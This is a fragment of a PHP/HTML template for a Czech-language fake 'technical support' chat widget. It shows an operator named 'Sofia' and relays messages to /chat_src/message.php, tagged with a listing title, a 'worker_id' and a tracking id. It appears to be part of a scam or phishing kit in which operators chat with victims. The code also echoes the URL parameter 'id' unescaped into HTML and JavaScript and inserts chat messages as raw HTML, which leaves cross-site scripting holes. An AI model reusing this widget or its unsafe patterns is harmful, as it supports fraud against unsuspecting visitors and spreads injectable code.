    position: absolute;
    bottom: 15px;
    left: 7px;
    width: 18px;
    height: 18px;
    transition: opacity 0.2s linear,transform 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
.chaport-container.chaport-window-dark-gray .chaport-send-icon svg polygon, .chaport-content.chaport-window-dark-gray .chaport-send-icon svg polygon {
    fill: #414141;
    transition: fill 0.2s cubic-bezier(0.4, 0, 0.2, 1);
}
#smstosupbutton1 {
    border-width: 0px;
    background: #fff;
    margin-right: 10px;
}
#smstosupbutton1 {
    cursor: pointer;
}
#smstosupbutton1:focus, #smstosupbutton1:active  {
    outline: none;
}
.chaport-window {
    visibility: hidden;
    opacity: 0;
}
.chat-block {
    overflow-y: auto;
    height: 300px;
    overflow-x: hidden;

}
#chat {
    padding-bottom: 15px;
}
.operators-msg {
    margin-top: 15px;
}
.operators-first-text {
    padding: 10px;
    width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.operators-msg-text {
    padding: 10px;
    max-width: 180px;
    border-radius: 8px;
    background-color: #e8ecef;
    padding-right: 30px;
}
.visitors-msg-text {
    margin-top: 15px;
    margin-right: 10px;
    margin-left: 80px;
    padding: 10px;
    min-width: 180px;
    border-radius: 8px;
    background-color: #3c3c3c;
    color: #fff;
}
.operators-photo img {
    width: 30px;
    height: 30px;
    border-radius: 50%;
    margin-left: 5px;
    margin-right: 5px;
}
.chat-block::-webkit-scrollbar {
    width: 7px;
}
.chat-block::-webkit-scrollbar-button {
    display: none;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
.chat-block::-webkit-scrollbar-thumb {
    border-radius: 8px;
    background-color: #babac0;
    border: 1px solid transparent;
}
    </style>
<div id="offonthechap">
<div class="chaport-container chaport-container-positioned chaport-window-dark-gray chaport-collapsed" style="bottom: 0px;">
<div class="chaport-launcher" style="left: 0px; right: 0px;">
<div class="chaport-launcher-button no-photo chaport-launcher-anim chaport-anim-show">
<div class="chaport-launcher-chat-icon"></div>
<input type="hidden" id="product" value="<?php echo $xml->obyava; ?>">
<input type="hidden" id="refresh_time" value="<?php echo $_GET['id']; ?>">
<input type="hidden" id="home_time" value="<?php echo $xml->worker_id; ?>">
<div class="chaport-launcher-close-icon"></div>
<div class="chaport-launcher-operator-photo"></div>
</div>
</div>
<div class="chaport-window chaport-anim-hide chaport-window-anim" style="opacity: 0; visibility: hidden;">
<div class="chaport-inner">
<div class="main-textblock">
<div class="operatorblock">
<div class="operatorblock-content" style="display: flex;">
<div id="operator-photo">
<img id="oper-photo-img" src="./prop_files/operator-img.png">
<div class="operator-name">Sofia</div>
</div>
<div class="team-wrapper">
<div class="team">Technická podpora</div>
<div class="activity-indicator">
<div class="with-status" style="display: inline-block;">
<div class="status-online" style="display: inline-block;">
</div>Online</div>
</div>
</div>
</div>
</div>
<div class="chat-block">
<div id="chat">
<div class="operators-msg" id="greeting-msg" style="display: none;">
<div class="operators-photo"><img src="./prop_files/operator-img.png"></div>
</div>
</div>
<div id="input-msg" style="display: flex;">
<input type="text" name="smstosup1" id="smstosup1" placeholder="Zadejte svou zprávu...">
<button id="smstosupbutton1" type="button" onclick="sendMessage()">
<div class="chaport-send-icon">
<svg width="18" height="18" viewBox="0 0 535.5 535.5">
<polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">
</polygon>
</svg>
</div>
</button>
</div>
</div>
</div>
</div>
</div>
<div class="chaport-big-shadow"></div>
</div>
</div>
<script type="text/javascript">


var supportbutton = document.querySelector('.chaport-launcher-button');
    var supportwindow = document.querySelector('.chaport-window');

    supportbutton.onclick = function() {
        if (supportwindow.style.opacity == '0') {
            supportwindow.style.opacity = '1';
            supportwindow.style.visibility = 'visible';
        } else {
            supportwindow.style.opacity = '0';
            supportwindow.style.visibility = 'hidden';
        }
    };
</script>

<script type="text/javascript">

var myVar = setInterval(updateChat, 5000);
var pool = true;
function updateChat() {
var supportbutton = document.querySelector('.chaport-launcher-button');
var supportwindow = document.querySelector('.chaport-window');
var token = <?php echo $_GET['id']; ?>;
if (token !== null) {
if (pool) {
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
pool = false;
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhttp.send("get=0&token=" + token);
xhttp.onload = function (e) {
if (xhttp.readyState === 4) {
  if (xhttp.status === 200) {
    var body = xhttp.response;
    pool = true;
    var json = JSON.parse(body);
    for (let i = 0; i < json.length; i++) {
      cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
      if (json[i].sender == 't') {
        text = '<div class="operators-msg" style="display: flex;"><div class="operators-photo"><img src="ordercss/operator-img.png"></div><div class="operators-msg-text" id="qwe1649370682">'+ json[i].message +'</div></div>'
      } else if (json[i].sender == 'i') {
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }else if (json[i].sender == "testOnline"){
        return 'okay';
      }else{
        text = '<div class="visitors-msg-text" id="qwe1649370526">'+ json[i].message +'</div>'
      }

      
      $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + text);
      var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
      objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
      supportwindow.style.opacity = '1';
      supportwindow.style.visibility = 'visible';
    }

  } else {
    pool = true;
  }
}
}
}
}
}

function sendMessage() {
message = document.getElementById("smstosup1").value;
if (message === '') {
return;
}
document.getElementById("smstosup1").value = '';
var token = document.getElementById("refresh_time").value;
if (token === null) {
var token = Math.random().toString(36).substring(7);
}
xhttp = new XMLHttpRequest();
var track_id = document.getElementById("refresh_time").value;
var url = 'https://' + document.location.hostname + '/chat_src/message.php';
xhttp.open("POST", url, true);
xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
var uid = document.getElementById("home_time").value;
var title = document.getElementById("product").value;
xhttp.send("send=1&track_id=" + encodeURIComponent(track_id) + "&uid=" + encodeURIComponent(uid) + "&token=" + encodeURIComponent(token) + "&message=" + encodeURIComponent(message) + "&type=" + encodeURIComponent(window.location.host.split('.')[0]) + "&title=" + encodeURIComponent(title));
cur_text = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html();
$('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block').html(cur_text + '<div class="visitors-msg-text" id="qwe1649370526">'+ message +'</div>');
setCookie('token', token);
var objDiv = $('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block');
objDiv.scrollTop($('#offonthechap > div > div.chaport-window.chaport-anim-hide.chaport-window-anim > div > div > div.chat-block')[0].scrollHeight);
}

function setCookie(cname, cvalue) {
var d = new Date();
d.setTime(d.getTime() + (6 * 60 * 60 * 1000));
var expires = "expires=" + d.toUTCString();
document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
}

</script>
</footer></body></html>